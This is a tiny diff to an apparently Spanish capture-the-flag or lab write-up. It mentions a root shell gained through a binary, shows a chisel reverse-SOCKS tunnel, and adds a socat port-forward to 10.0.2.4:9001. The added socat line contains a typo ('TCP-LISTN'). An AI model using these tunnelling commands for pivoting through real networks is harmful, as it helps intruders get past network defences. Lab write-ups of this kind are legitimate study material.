@@ -490,6 +490,8 @@ explotando este binario logramos conseguir una bash con privilegios elevados
 
 > ./chisel client 10.0.2.4:8000 R:socks
 
+> ./socat TCP-LISTN:1221,fork TCP:10.0.2.4:9001
+
 
 ```
 
